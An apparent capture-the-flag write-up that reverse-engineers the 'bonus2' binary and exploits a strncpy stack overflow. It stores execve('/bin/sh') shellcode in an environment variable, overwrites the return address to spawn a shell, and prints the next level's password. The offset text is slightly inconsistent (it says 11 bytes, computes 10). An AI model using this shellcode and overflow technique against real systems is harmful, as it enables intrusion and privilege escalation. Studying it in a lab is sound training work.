# STRCPY not null-terminated, SHELLCODE in environment variable

```asm
08048529 <main>:
 8048529:	55                   	push   ebp
 804852a:	89 e5                	mov    ebp,esp
 804852c:	57                   	push   edi
 804852d:	56                   	push   esi
 804852e:	53                   	push   ebx
 804852f:	83 e4 f0             	and    esp,0xfffffff0
 8048532:	81 ec a0 00 00 00    	sub    esp,0xa0
 8048538:	83 7d 08 03          	cmp    DWORD PTR [ebp+0x8],0x3
 804853c:	74 0a                	je     8048548 <main+0x1f>
 804853e:	b8 01 00 00 00       	mov    eax,0x1
 8048543:	e9 e8 00 00 00       	jmp    8048630 <main+0x107>
```
- End of program if argc (ebp+0x8) is not 3
- We must put 2 CLI arguments

```asm
 8048548:	8d 5c 24 50          	lea    ebx,[esp+0x50]
 804854c:	b8 00 00 00 00       	mov    eax,0x0
 8048551:	ba 13 00 00 00       	mov    edx,0x13
 8048556:	89 df                	mov    edi,ebx
 8048558:	89 d1                	mov    ecx,edx
 804855a:	f3 ab                	rep stos DWORD PTR es:[edi],eax
 804855c:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804855f:	83 c0 04             	add    eax,0x4
 8048562:	8b 00                	mov    eax,DWORD PTR [eax]
 8048564:	c7 44 24 08 28 00 00 	mov    DWORD PTR [esp+0x8],0x28
 804856b:	00 
 804856c:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048570:	8d 44 24 50          	lea    eax,[esp+0x50]
 8048574:	89 04 24             	mov    DWORD PTR [esp],eax
 8048577:	e8 44 fe ff ff       	call   80483c0 <strncpy@plt>
 804857c:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804857f:	83 c0 08             	add    eax,0x8
 8048582:	8b 00                	mov    eax,DWORD PTR [eax]
 8048584:	c7 44 24 08 20 00 00 	mov    DWORD PTR [esp+0x8],0x20
 804858b:	00 
 804858c:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048590:	8d 44 24 50          	lea    eax,[esp+0x50]
 8048594:	83 c0 28             	add    eax,0x28
 8048597:	89 04 24             	mov    DWORD PTR [esp],eax
 804859a:	e8 21 fe ff ff       	call   80483c0 <strncpy@plt>
```
2 strncpy calls are made on the 2 CLI arguments:
- first argument is copied (max 0x28 bytes, 40 in decimal) to [esp+0x50]
- second argument is copied (max 0x20 bytes, 32 in decimal) to [esp+0x78], at the end of the first argument

```shell
(gdb) p (char*) 0x8048738
$1 = 0x8048738 "LANG"
(gdb) p (char*) 0x804873d
$2 = 0x804873d "fi"
(gdb) p (char*) 0x8048740
$4 = 0x8048740 "nl"
```
```asm
 804859f:	c7 04 24 38 87 04 08 	mov    DWORD PTR [esp],0x8048738
 80485a6:	e8 d5 fd ff ff       	call   8048380 <getenv@plt>
 80485ab:	89 84 24 9c 00 00 00 	mov    DWORD PTR [esp+0x9c],eax
 80485b2:	83 bc 24 9c 00 00 00 	cmp    DWORD PTR [esp+0x9c],0x0
 80485b9:	00 
 80485ba:	74 5c                	je     8048618 <main+0xef>
 80485bc:	c7 44 24 08 02 00 00 	mov    DWORD PTR [esp+0x8],0x2
 80485c3:	00 
 80485c4:	c7 44 24 04 3d 87 04 	mov    DWORD PTR [esp+0x4],0x804873d
 80485cb:	08 
 80485cc:	8b 84 24 9c 00 00 00 	mov    eax,DWORD PTR [esp+0x9c]
 80485d3:	89 04 24             	mov    DWORD PTR [esp],eax
 80485d6:	e8 85 fd ff ff       	call   8048360 <memcmp@plt>
 80485db:	85 c0                	test   eax,eax
 80485dd:	75 0c                	jne    80485eb <main+0xc2>
 80485df:	c7 05 88 99 04 08 01 	mov    DWORD PTR ds:0x8049988,0x1
 80485e6:	00 00 00 
 80485e9:	eb 2d                	jmp    8048618 <main+0xef>
 80485eb:	c7 44 24 08 02 00 00 	mov    DWORD PTR [esp+0x8],0x2
 80485f2:	00 
 80485f3:	c7 44 24 04 40 87 04 	mov    DWORD PTR [esp+0x4],0x8048740
 80485fa:	08 
 80485fb:	8b 84 24 9c 00 00 00 	mov    eax,DWORD PTR [esp+0x9c]
 8048602:	89 04 24             	mov    DWORD PTR [esp],eax
 8048605:	e8 56 fd ff ff       	call   8048360 <memcmp@plt>
 804860a:	85 c0                	test   eax,eax
 804860c:	75 0a                	jne    8048618 <main+0xef>
 804860e:	c7 05 88 99 04 08 02 	mov    DWORD PTR ds:0x8049988,0x2
 8048615:	00 00 00 
```
The environment variable "LANG" is checked:
- if it is starting by "fi", 0x1 is stored at 0x8049988
- if it is starting by "nl", 0x2 is stored at 0x8049988
- otherwise,                 0x0 is the default value at 0x8049988

```asm
 8048618:	89 e2                	mov    edx,esp
 804861a:	8d 5c 24 50          	lea    ebx,[esp+0x50]
 804861e:	b8 13 00 00 00       	mov    eax,0x13
 8048623:	89 d7                	mov    edi,edx
 8048625:	89 de                	mov    esi,ebx
 8048627:	89 c1                	mov    ecx,eax
 8048629:	f3 a5                	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
 804862b:	e8 54 fe ff ff       	call   8048484 <greetuser>
 8048630:	8d 65 f4             	lea    esp,[ebp-0xc]
 8048633:	5b                   	pop    ebx
 8048634:	5e                   	pop    esi
 8048635:	5f                   	pop    edi
 8048636:	5d                   	pop    ebp
 8048637:	c3                   	ret    
```
- Then greetuser is called with the buffer containing 40 first bytes of 1st CLI arg, and 32 first bytes of 2nd CLI arg

## Detection of the vulnerability
We already know strncpy can be vulnerable if the source is bigger than the size of the copy
Lets try, with all LANG values ("fi", "nl" and default), to put bigger strings to overwrite the return address

### LANG=fi

```shell
~$ export LANG="fi blablabla" && gdb ./bonus2
(gdb) r $(python -c 'print "A"*40') $(python -c 'print "B"*18')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x08048600 in main ()

(gdb) r $(python -c 'print "A"*40') $(python -c 'print "B"*19')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x08040042 in ?? ()
```
The 19th 'B' overwrites the first byte of the return address, here we can put the address of a shellcode. Where to put it :
- we can put it in the first cli argument
- but we never used a shellcode from an environment variable, so we can try this method this time !

```shell
~$ export SHELLCODE=$(python -c 'print 100 * "\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
~$ gdb ./bonus2 
(gdb) b main 
(gdb) run a a
(gdb) x/20s *((char**)environ)
...
0xbffff8a7:	 "SHELLCODE=\\x90\\x90\\x90\\x90\\x90\\x90\\x90...\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80"
...
```
- Our shellcode is at 0xbffff8a7, we add 11 bytes to go after the '=', 0xbffff8a7 + 10 = 0xbffff8b1

```shell
~$ ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\xb1\xf8\xff\xbf"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
